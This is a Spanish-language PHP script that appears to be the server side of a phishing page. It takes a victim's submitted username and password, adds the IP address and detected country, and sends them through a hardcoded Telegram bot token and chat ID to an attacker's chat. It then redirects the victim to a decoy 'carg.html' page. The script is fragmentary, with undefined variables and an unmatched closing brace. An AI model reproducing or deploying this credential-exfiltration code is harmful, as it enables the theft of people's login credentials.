<?php

$token = "7887181406:AAFU8QeJELdGChri-GoD9jlq7Wa2JbVBkvw";
$chat_id = "5157616506";

// Función para obtener el país a partir de la IP
function obtenerPais($ip) {
    $url = "https://api.country.is/$ip"; // Nueva API para mayor precisión
    $respuesta = file_get_contents($url);

    if ($respuesta) {
        $datos = json_decode($respuesta, true);
        return $datos["country_code"] ?? "XX"; // Devuelve el código del país (NI, HN, GT) o "XX" si no hay respuesta
    }

    return "XX"; // Si hay un error en la API, devuelve "XX" por defecto
}

 

    $mensaje = "🛑 AVanz:: acceso 🛑\n\n";
    $mensaje .= "👤 Usuario: $usuario\n";
    $mensaje .= "🔑 Contraseña: $contrasena\n";
    $mensaje .= "📍 IP: $ip\n";
    $mensaje .= "🌍 País Detectado: $pais\n";

    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $mensaje,
        'parse_mode' => 'HTML'
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];

    $context  = stream_context_create($options);
    file_get_contents($url, false, $context);

    header("Location: carg.html");
    exit();
}
?>
